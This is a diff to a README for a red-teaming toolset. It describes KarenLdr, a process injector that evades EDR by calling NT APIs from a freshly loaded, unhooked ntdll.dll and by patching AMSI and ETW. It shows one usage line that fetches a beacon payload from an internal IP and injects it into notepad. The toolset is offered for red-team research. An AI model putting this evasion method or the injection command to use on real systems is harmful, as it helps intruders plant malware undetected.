@@ -2,6 +2,7 @@
 A series of custom offensive toolset and utilities written in C# and Rust. This project is developed to explore AV evasion techniques for aiding red teaming operations. 
 
 ## KarenLdr
+KarenLdr is a compact Process Injector with various evasion techniques built-in to it. To evade static signature, KarenLdr leverages low level NT**API calls (with the exception of AMSI & ETW patching) and a modified version of D/Invoke library. At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original ntdll.dll that was hooked by EDR is left untouched. All NT*API are then exported and called from the clean copy of ntdll.dll instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with.
 ```
 C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 -k 
      _        _______  _______  _______  _        _        ______   _______
